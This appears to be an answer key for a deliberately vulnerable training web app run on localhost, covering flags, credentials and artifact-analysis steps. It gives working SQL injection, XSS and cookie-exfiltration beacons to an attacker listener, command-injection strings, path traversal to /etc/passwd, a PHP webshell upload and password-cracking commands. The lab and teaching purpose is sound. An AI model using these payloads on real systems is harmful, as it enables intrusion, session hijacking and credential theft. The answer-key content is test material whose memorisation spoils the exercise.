---
tags: [css-exam, labs, solution, web]
---
# VulnCorp (app 1) — Solutions
> ↑ Lab Kit · method: Web Penetration Test Checklist

Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http://localhost:8000`.

## 🏁 Flags — one per vuln (track them on the 📊 Progress page)
| Vuln | Flag | How you get it |
|---|---|---|
| SQL injection | `FLAG{sql1_auth_byp4ss_and_1dor}` | UNION-dump / auth-bypass → admin's `private_note` |
| Reflected & Stored XSS | `FLAG{xss_st34ls_the_c00kie}` | steal the (non-HttpOnly) `flag` cookie via `document.cookie` |
| IDOR | `FLAG{sql1_auth_byp4ss_and_1dor}` | `profile.php?id=1` → admin's note |
| Command injection | `FLAG{c0mmand_1njection_rce_on_host}` | `;cat private/cmdi_flag.txt` via Net Tools |
| LFI / traversal | `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}` | `?page=../../lfi_secret/flag.txt` |
| File upload | `FLAG{w3bshell_upl0ad_to_rce}` | webshell → `cat private/upload_flag.txt` |
| Info disclosure | `FLAG{c0nfig_backup_left_in_webroot}` | `GET /config.php.bak` |
| Weak creds | admin's note (above) | log in as `admin` with the cracked/guessed password |
| Weak CSP (+ cookie theft) | `FLAG{xss_st34ls_the_c00kie}` (via stored XSS) | DevTools → Network → Response Headers (CSP) + Console `document.cookie`; non-HttpOnly cookie + unsafe-inline |

## 1. SQL injection — auth bypass + UNION  (`login.php`, `index.php?q=`)
**Answer:** login is a string-concatenated query → bypass with a comment; search is injectable → UNION-dump every credential.
**Command:**
```
# auth bypass:
curl -s "$U/login.php" --data-urlencode "username=admin'-- -" --data-urlencode "password=x"
# dump all users via UNION (3 columns to match the SELECT):
curl -sG "$U/index.php" --data-urlencode "q=zzz%' UNION SELECT username,password,role FROM users-- -"
```
**Result:** logs in as admin → `FLAG{sql1_auth_byp4ss_and_1dor}`; UNION lists `admin:S3ntinel!Admin`, `alice:password123`, …
**Reason:** `"...WHERE username='$u' AND password='$p'"` — `admin'-- -` closes the string and comments out the password check; the search column count (3) matches so the UNION rows render.

## 2. Reflected XSS  (`index.php?q=`)
**Answer:** `q` is echoed into the HTML unencoded.
**Command:** `$U/index.php?q="><script>alert(document.domain)</script>`
**Result:** the script tag lands in the page and executes. **Reason:** no `htmlspecialchars()` on output.

## 3. Stored XSS  (guestbook on `index.php`)  — and "what can XSS actually do?"
**Answer:** the comment **body** is stored and rendered raw (the author is escaped — put the payload in the *message*).
**Confirm it runs:** post `<script>alert('stored xss')</script>` in the message → reload → it fires for every visitor.

**"How do I get information from it?"** XSS runs JS *as the victim*, so you can read their session/DOM and **exfiltrate** it. There's a non-HttpOnly `flag` cookie here to prove it — steal it:
```
# 1) start a listener on Kali to catch the stolen data:
python3 -m http.server 9001
# 2) post this as the guestbook MESSAGE (the payload beacons the victim's cookies to you):
<script>new Image().src='http://127.0.0.1:9001/steal?c='+encodeURIComponent(document.cookie)</script>
# 3) reload the guestbook -> your listener logs:  GET /steal?c=flag=FLAG{xss_st34ls_the_c00kie}
```
**Flag:** `FLAG{xss_st34ls_the_c00kie}` (arrives in your listener). **Result:** real cookie/session theft — in a live app that cookie would be the victim's login session. Other payloads: keylogging, making requests as the victim, defacing. **Reason:** `body` echoed without encoding.
> Reflected XSS (search box) steals the same cookie — the difference is stored = hits every visitor automatically; reflected = needs a crafted link.

## 4. IDOR  (`profile.php?id=`)
**Answer:** no ownership check — any `id` reveals that user's note + API key.
**Command:** `curl -s "$U/profile.php?id=1"`
**Result:** admin's record → `FLAG{sql1_auth_byp4ss_and_1dor}` + API key. **Reason:** object id trusted straight from the URL.

## 5. Command injection  (`tools.php?host=`)
**Answer:** `host` is concatenated into a shell `ping`.
**Command:** `curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1;id"`  (also `|id`, `$(id)`, `&&id`)
**Result:** `uid=... ` appears below the ping output. **Reason:** `shell_exec("ping -c 1 ".$host)` — no escaping.

## 6. LFI / path traversal  (`index.php?page=`)
**Answer:** `page` is included with no sanitisation, so `../` escapes the `pages/` directory.
**Command:**
```
# FLAG — a file OUTSIDE the web root, deterministic depth: only 2 ../ (extra ../ are harmless)
curl -sG "$U/index.php" --data-urlencode "page=../../lfi_secret/flag.txt"
# bonus: a system file — add ENOUGH ../ to reach / (depth depends on where the kit is installed,
#        and may be blocked by open_basedir); the flag above is the reliable target
curl -sG "$U/index.php" --data-urlencode "page=../../../../../../../etc/passwd"
```
**Result:** `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}` (and, with enough `../`, `root:x:0:0:`).
**Reason:** `include __DIR__."/pages/".$page`; `lfi_secret/` is a sibling of `webapp/` (outside the docroot),
so it is reachable only via traversal and always at exactly 2 `../` from `pages/`.

## 7. Insecure file upload  (`upload.php`)
**Answer:** no extension/type check → upload a PHP webshell under the web root and run it.
**Command:**
```
echo '<?php system($_GET["c"]); ?>' > sh.php
curl -s -F "file=@sh.php" "$U/upload.php"
curl -s "$U/uploads/sh.php?c=id"
```
**Result:** `uid=...` → RCE. **Reason:** `move_uploaded_file` with the raw client filename, no validation; `uploads/` is servable.

## 8. Weak CSP + cookie theft  (every page)

**Answer:** the CSP is present but bypassable — `script-src 'unsafe-inline'` lets injected inline scripts
run, `img-src *` lets a beacon exfiltrate to any host, and the session/flag cookie is set **without
`HttpOnly`**, so JavaScript can read it. Chained with the stored XSS this steals the cookie:
`FLAG{xss_st34ls_the_c00kie}`.

**Command (read the header/cookie in the browser — no terminal needed):**
```
# 1. See the CSP:  DevTools (F12) -> Network -> reload (Ctrl+R) -> click "index.php" -> Response Headers
#      Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; img-src *
# 2. See the cookie:  DevTools -> Console ->  document.cookie
#      flag=FLAG{xss_st34ls_the_c00kie}    (it's visible -> cookie has NO HttpOnly -> JS can read it)

# attacker listener (receives the stolen cookie in its access log)
python3 -m http.server 9001

# payload posted as a GUESTBOOK MESSAGE (stored XSS); runs in every viewer's browser
<script>new Image().src='http://ATTACKER:9001/steal?c='+document.cookie</script>
```
**Result:** on page load the listener logs `GET /steal?c=flag=FLAG{xss_st34ls_the_c00kie}`.

**Reason / how the payload is derived:**
- Stored XSS → arbitrary JS runs in viewers' browsers.
- `document.cookie` is readable because the cookie has **no `HttpOnly`** → there's a value worth stealing.
- Exfiltrate by making the browser request an attacker URL with the data in the query string.
- **Use an image beacon, not `fetch()`** — the CSP has `img-src *` (image to any host = allowed) but no
  `connect-src`, which falls back to `default-src 'self'` (so `fetch`/XHR to an external host = blocked).
  Reading the CSP tells you which exfil channel survives it.

**Impact:** session hijacking via XSS despite a CSP being deployed — a false sense of security.

**Remediation (any one breaks the chain):** drop `'unsafe-inline'` (use a nonce/hash); restrict `img-src`
to known hosts (and set `connect-src`); set the cookie **`HttpOnly; Secure; SameSite=Strict`** — `HttpOnly`
alone would have stopped the theft even with the weak CSP.

> Finding the headers (all in the browser):
> - **CSP:** DevTools (F12) → **Network** → reload (Ctrl+R) → click the document (`index.php`) → **Response Headers**.
> - **Cookie:** DevTools → **Console** → type `document.cookie` (or **Application/Storage → Cookies**).
> Request headers are what the browser sends; **CSP and Set-Cookie are response headers** (server → browser).

## 9. Information disclosure — exposed config backup leaks admin creds

**Answer:** a backup of the app config (`config.php.bak`) is left in the web root. Because `.bak` is
not executed by PHP it is served as plaintext source, leaking `ADMIN_PASS = S3ntinel!Admin` and
`API_SIGNING_KEY = sk_live_9f2c1a77d4b0e5f6a1b2c3d4`. `robots.txt` advertised the path.
Flag: `FLAG{c0nfig_backup_left_in_webroot}`.

**Discovery (how the path was found):** the app returns a page for almost every path, so plain
status-based busting is noisy and `robots.txt`/`uploads` get hidden (they 404). `feroxbuster` with
all status codes + link extraction surfaces them:
```
feroxbuster -u http://localhost:8000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# -> 200 config.php.bak ; 404 .well-known /private /uploads /pages   (the real paths)
```
(ffuf/gobuster work too once you filter the wildcard: `ffuf ... -ac` or `gobuster ... --exclude-length 3545,5577`.)

**Command:**
```
curl -s "$U/robots.txt"                          # map of "hidden" paths
curl -s "$U/config.php.bak"                       # served as PLAINTEXT -> ADMIN_PASS + API_SIGNING_KEY
curl -s "$U/.well-known/security.txt"             # points to the deployment notes
curl -s "$U/private/deployment-notes.txt"         # confirms creds are live
curl -s "$U/" | grep -i '<!--'                    # dev TODO comment
```

**Result:**
```
# robots.txt -> Disallow: /private/  /config.php.bak  /.well-known/
# config.php.bak ->
$ADMIN_USER      = 'admin';
$ADMIN_PASS      = 'S3ntinel!Admin';
$API_SIGNING_KEY = 'sk_live_9f2c1a77d4b0e5f6a1b2c3d4';
// FLAG{c0nfig_backup_left_in_webroot}
# deployment-notes.txt -> "credential rotation: pending (still S3ntinel!Admin)"
```
Then `admin : S3ntinel!Admin` logs in at `/login.php` → full admin.

**Reason:** `config.php` is executed by PHP (source never returned); the `.bak` copy has no PHP
handler so the server returns it verbatim. `robots.txt` is **not** access control — it only
enumerated the sensitive paths.

> Gotcha: opening `config.php.bak` in a **browser looks blank** — the browser hides `<?php … ?>` as an
> unknown processing-instruction tag. Use **View Source (Ctrl+U)** or `curl` to read it.

**Impact:** unauthenticated disclosure of the admin password + an API signing key → full compromise
and the ability to forge signed API requests.

**Remediation:** keep configs **outside** the web root; remove `*.bak`/`*.old`/`*~`/`*.swp`/`.git/`
from it; protect sensitive paths with auth (not `robots.txt`); rotate the exposed password and key.

## 10. Weak / default credentials  (`login.php`)
**Answer:** several accounts use guessable passwords.
**Command:** try `admin:S3ntinel!Admin`, `alice:password123`, `bob:letmein`, `svc_backup:Backup2024!` (or Hydra against the form).
**Reason:** weak password policy on service/user accounts.

---
## File artifacts (brief)
- **certs/bad-webmail.crt** → `openssl x509 -in bad-webmail.crt -noout -text`: self-signed (subject=issuer), **1024-bit**, **expired 2022→2023**, SAN has wildcard+IP = 3 flaws; a browser would reject it (untrusted + expired).
- **chain** → `openssl verify -CAfile root_ca.pem -untrusted intermediate_ca.pem server.pem` = OK; CRL: `openssl crl -in intermediate.crl -noout -text` (revoked list contains `revoked.pem`, not `server.pem`).
- **keys/encrypted_rsa** → crack passphrase: `ssh2john encrypted_rsa > h; john h --wordlist=rockyou.txt` → `Summer2024!`; derive pub: `ssh-keygen -y -f id_ed25519`.
- **email/phishing.eml** → `grep -aboF 'LS0tLS1CRUdJTiBPUEVOU1NI' phishing.eml` finds the key appended outside MIME; decode the trailing base64 → OpenSSH key. Headers: SPF=fail, dkim=none, Reply-To to a different domain.
- **network/*.pcap** → `tshark -r http_login_cleartext.pcap -z follow,tcp,ascii,0 -q` → `username=admin&password=S3ntinel!Admin`.
- **data/kpi_audit.db** → `sqlite3 kpi_audit.db "SELECT COUNT(DISTINCT user_id) FROM sessions WHERE substr(started_at,1,10)='2026-06-30'"` ≈ 130 vs claimed 24500 (overstated); exclude out-of-window July rows + decoy models/internal users.
- **data/medical_release.csv + voter_list.csv** → join on age+zip+gender: rows unique on those 3 quasi-identifiers (e.g. age 29/zip 8001/F appears >1 but 55/3011/M links to one name) → re-identify.
- **hashes/** → `hashid`/`hash-identifier`, then `john --wordlist=rockyou.txt`: md5→password, sha1→dragon, apr1→summer, sha512→hunter2.
